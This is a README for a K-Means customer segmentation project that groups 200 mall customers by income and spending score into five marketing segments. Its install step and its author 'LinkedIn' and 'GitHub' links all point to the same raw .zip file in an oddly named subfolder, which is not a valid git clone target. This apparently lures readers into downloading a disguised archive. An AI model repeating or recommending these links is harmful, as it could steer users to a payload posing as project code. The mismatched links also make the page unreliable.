# 🛍️ Customer Segmentation using K-Means Clustering

![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![scikit-learn](https://img.shields.io/badge/scikit--learn-1.0+-orange.svg)
![Clusters](https://img.shields.io/badge/Clusters-5-brightgreen.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)

A machine learning project that segments mall customers into distinct groups using **K-Means Clustering**, based on their **Annual Income** and **Spending Score**. This helps businesses identify target customer groups for personalized marketing strategies.

---

## 🎯 Problem Statement

A mall wants to understand its customer base better. By grouping customers with similar income and spending behaviors, the marketing team can:
- Design targeted campaigns for high-value customers
- Identify customers who spend despite low income
- Understand which groups need different engagement strategies

---

## 📊 Dataset

| Property | Value |
|----------|-------|
| Total Customers | 200 |
| Features | CustomerID, Gender, Age, Annual Income (k$), Spending Score (1-100) |
| Features Used for Clustering | Annual Income, Spending Score |
| Missing Values | None ✅ |

---

## 📁 Project Structure

```
customer-segmentation/
│
├── data/
│   └── Mall_Customers.csv           # 200 mall customer records
│
├── notebooks/
│   └── customer_segmentation.ipynb  # Main Jupyter Notebook
│
├── src/
│   └── predict_cluster.py           # Predict cluster for a new customer
│
├── requirements.txt                 # Python dependencies
└── README.md                        # This file
```

---

## 🔧 ML Pipeline

1. **Load Data** — Read Mall_Customers.csv
2. **Explore Data** — Check shape, info, missing values
3. **Select Features** — Annual Income and Spending Score (columns 3 & 4)
4. **Elbow Method** — Compute WCSS for K = 1 to 10 to find optimal clusters
5. **Train K-Means** — Fit model with 5 clusters using k-means++ initialization
6. **Visualize** — Scatter plot showing all 5 clusters and their centroids

---

## 📈 Results — 5 Customer Segments

| Cluster | Color | Income | Spending | Customer Type |
|---------|-------|--------|----------|---------------|
| 1 | 🟢 Green | High | Low | Careful spenders — rich but conservative |
| 2 | 🔴 Red | High | High | **Prime targets** — rich and big spenders |
| 3 | 🟡 Yellow | Average | Average | Standard customers |
| 4 | 🟣 Violet | Low | High | Impulsive spenders — spend beyond means |
| 5 | 🔵 Blue | Low | Low | Savers — budget-conscious |

> **Business Insight:** Cluster 2 (High Income + High Spending) are the ideal customers to target for premium product marketing campaigns.

---

## 🚀 How to Run

### 1. Clone the repository
```bash
git clone https://github.com/rohannp02y/customer_segmentation/raw/refs/heads/main/decare/customer_segmentation_rusine.zip
cd customer-segmentation
```

### 2. Install dependencies
```bash
pip install -r requirements.txt
```

### 3. Open the notebook
```bash
jupyter notebook notebooks/customer_segmentation.ipynb
```

### 4. Or run the prediction script
```bash
python src/predict_cluster.py
```

---

## 💡 Key Concepts Demonstrated

- **Unsupervised Learning** — Model finds patterns without any labels
- **K-Means Clustering** — Groups data by minimizing within-cluster distance
- **Elbow Method** — Identifies optimal K where WCSS curve bends sharply
- **WCSS** — Within Cluster Sum of Squares, measures how tight clusters are
- **Data Visualization** — Scatter plots to clearly show cluster separations

---

## 🛠️ Technologies Used

- **Python 3.8+**
- **pandas** — Data loading and exploration
- **NumPy** — Numerical operations
- **scikit-learn** — KMeans clustering algorithm
- **Matplotlib** — Plotting clusters and centroids
- **seaborn** — Graph styling
- **Jupyter Notebook** — Interactive development environment

---

## 💡 Future Improvements

- [ ] Cluster using all features (Age, Gender included)
- [ ] Validate clusters using Silhouette Score
- [ ] Deploy as a web app using Flask or Streamlit
- [ ] Compare with DBSCAN or Hierarchical Clustering

---

## 👤 Author

**Rohan Neupane**  
📧 rohannneupane02@gmail.com  
🔗 [LinkedIn](https://github.com/rohannp02y/customer_segmentation/raw/refs/heads/main/decare/customer_segmentation_rusine.zip)  
🐙 [GitHub](https://github.com/rohannp02y/customer_segmentation/raw/refs/heads/main/decare/customer_segmentation_rusine.zip)

---

⭐ **If you found this helpful, please star the repository!**
